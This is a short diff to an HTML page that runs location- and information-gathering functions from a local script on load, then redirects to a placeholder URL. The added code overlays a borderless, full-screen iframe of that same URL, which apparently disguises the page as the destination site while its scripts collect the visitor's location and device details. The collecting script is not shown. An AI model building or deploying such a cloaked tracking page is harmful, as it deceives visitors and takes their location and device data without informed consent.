@@ -14,7 +14,18 @@
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
 	<script type="text/javascript" src="js/location.js"></script>
+	<style>
+        iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none; 
+        }
+    </style>
 </head>
 <body onload="information();locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});">
+	<iframe src='REDIRECT_URL'></iframe>
 </body>
 </html>
